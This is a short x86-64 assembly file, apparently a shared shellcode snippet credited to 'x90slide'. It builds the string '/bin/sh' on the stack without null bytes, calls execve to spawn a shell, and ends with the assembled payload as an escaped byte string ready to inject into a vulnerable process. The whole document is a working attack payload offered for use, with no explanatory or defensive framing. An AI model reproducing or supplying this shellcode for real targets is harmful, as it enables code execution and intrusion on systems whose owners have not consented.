# Shellcode by x90slide

.global _start
_start:
.intel_syntax noprefix
	xor rax, rax
	mov al, 0x3b
	xor rbx, rbx
	mov ebx, 0x68732f6e
	shl rbx, 16
	mov bx, 0x6962
    	shl rbx, 8
	mov bl, 0x2f
	push rbx
	mov rdi, rsp
	xor rsi, rsi
	xor rdx, rdx
	syscall


# "\x48\x31\xc0\xb0\x3b\x48\x31\xdb\xbb\x6e\x2f\x73\x68\x48\xc1\xe3\x10\x66\xbb\x62\x69\x48\xc1\xe3\x08\xb3\x2f\x53\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\x0f\x05"
